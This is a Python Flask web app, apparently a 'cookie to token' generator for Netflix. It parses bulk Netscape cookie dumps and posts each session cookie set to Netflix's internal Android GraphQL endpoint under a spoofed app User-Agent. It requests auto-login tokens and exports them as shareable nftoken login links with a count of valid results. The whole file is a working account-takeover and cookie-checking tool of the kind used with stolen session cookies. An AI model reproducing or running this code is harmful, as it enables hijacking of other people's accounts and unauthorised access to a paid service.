#!/usr/bin/env python3
"""
Netflix Cookie to Token Generator - Web Version
Estilo Aerosol con fondo Netflix
"""

from flask import Flask, render_template, request, jsonify, session
import requests
import json
import re
import os
from datetime import datetime
from typing import Dict, List, Tuple, Optional
import uuid

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024  # 10MB max

class NetflixTokenChecker:
    def __init__(self):
        self.session = requests.Session()
        self.headers = {
            'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
            'Accept': 'multipart/mixed;deferSpec=20220824, application/graphql-response+json, application/json',
            'Content-Type': 'application/json',
            'Origin': 'https://www.netflix.com',
            'Referer': 'https://www.netflix.com/'
        }
        self.api_url = 'https://android13.prod.ftl.netflix.com/graphql'

    def parse_netscape_cookie_line(self, line: str) -> Dict[str, str]:
        parts = line.strip().split('\t')
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            return {name: value}
        return {}

    def parse_netscape_cookies(self, content: str) -> List[Dict[str, str]]:
        cookies_list = []
        current_cookie_set = {}
        lines = content.split('\n')
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            cookie = self.parse_netscape_cookie_line(line)
            if cookie:
                current_cookie_set.update(cookie)
                if 'NetflixId' in current_cookie_set and 'SecureNetflixId' in current_cookie_set and 'nfvdid' in current_cookie_set:
                    cookies_list.append(current_cookie_set.copy())
                    current_cookie_set = {}
        return cookies_list

    def extract_cookies_from_text(self, text: str) -> List[Dict[str, str]]:
        if '\t' in text and ('NetflixId' in text or 'nfvdid' in text):
            netscape_cookies = self.parse_netscape_cookies(text)
            if netscape_cookies:
                return netscape_cookies
        return []

    def build_cookie_string(self, cookie_dict: Dict[str, str]) -> str:
        return '; '.join([f"{k}={v}" for k, v in cookie_dict.items()])

    def generate_token(self, cookie_dict: Dict[str, str]) -> Tuple[bool, Optional[str], Optional[str]]:
        required = ['NetflixId', 'SecureNetflixId', 'nfvdid']
        missing = [c for c in required if c not in cookie_dict]
        if missing:
            return False, None, f"Missing cookies: {', '.join(missing)}"

        cookie_str = self.build_cookie_string(cookie_dict)
        payload = {
            "operationName": "CreateAutoLoginToken",
            "variables": {"scope": "WEBVIEW_MOBILE_STREAMING"},
            "extensions": {
                "persistedQuery": {
                    "version": 102,
                    "id": "76e97129-f4b5-41a0-a73c-12e674896849"
                }
            }
        }
        headers = self.headers.copy()
        headers['Cookie'] = cookie_str

        try:
            response = self.session.post(self.api_url, headers=headers, json=payload, timeout=30)
            if response.status_code == 200:
                data = response.json()
                if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
                    return True, data['data']['createAutoLoginToken'], None
                elif 'errors' in data:
                    return False, None, f"API Error: {data['errors'][0].get('message', 'Unknown error')}"
                else:
                    return False, None, f"Unexpected response: {data}"
            elif response.status_code == 401:
                return False, None, "Expired cookies (401 Unauthorized)"
            else:
                return False, None, f"HTTP {response.status_code}: {response.text[:200]}"
        except Exception as e:
            return False, None, f"Connection error: {str(e)}"

    def format_nftoken_link(self, token: str) -> str:
        return f"https://netflix.com/?nftoken={token}"


checker = NetflixTokenChecker()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/process', methods=['POST'])
def process():
    """Procesa las cookies y genera tokens"""
    try:
        if 'file' in request.files and request.files['file'].filename:
            file = request.files['file']
            content = file.read().decode('utf-8', errors='ignore')
        else:
            content = request.form.get('cookies_text', '')
            
        if not content:
            return jsonify({'error': 'No cookies provided'}), 400
            
        cookies_list = checker.extract_cookies_from_text(content)
        
        if not cookies_list:
            return jsonify({'error': 'No valid Netflix cookies found in the provided text/file'}), 400
            
        results = []
        session_id = str(uuid.uuid4())[:8]
        
        for idx, cookie_dict in enumerate(cookies_list, 1):
            success, token, error = checker.generate_token(cookie_dict)
            
            if success and token:
                results.append({
                    'index': idx,
                    'success': True,
                    'token': token,
                    'link': checker.format_nftoken_link(token),
                    'cookies': {k: v[:20] + '...' for k, v in cookie_dict.items()}
                })
            else:
                results.append({
                    'index': idx,
                    'success': False,
                    'error': error,
                    'cookies': {k: v[:20] + '...' for k, v in cookie_dict.items()}
                })
        
        return jsonify({
            'success': True,
            'total': len(cookies_list),
            'valid': len([r for r in results if r['success']]),
            'results': results,
            'session_id': session_id,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })
        
    except Exception as e:
        return jsonify({'error': f'Server error: {str(e)}'}), 500

@app.route('/export', methods=['POST'])
def export():
    """Exporta resultados a archivo de texto"""
    try:
        data = request.json
        results = data.get('results', [])
        
        if not results:
            return jsonify({'error': 'No results to export'}), 400
            
        content = "NETFLIX TOKENS GENERATED\n"
        content += "=" * 60 + "\n"
        content += f"Created: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        
        for r in results:
            if r['success']:
                content += f"\n--- Token #{r['index']} ---\n"
                content += f"🔗 Token: {r['token']}\n"
                content += f"🔗 Link: {r['link']}\n"
                content += "Cookies used:\n"
                for k, v in r['cookies'].items():
                    content += f"  {k}: {v}\n"
                content += "\n" + "-" * 40 + "\n"
        
        return jsonify({
            'success': True,
            'content': content,
            'filename': f"netflix_tokens_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        })
        
    except Exception as e:
        return jsonify({'error': f'Export error: {str(e)}'}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)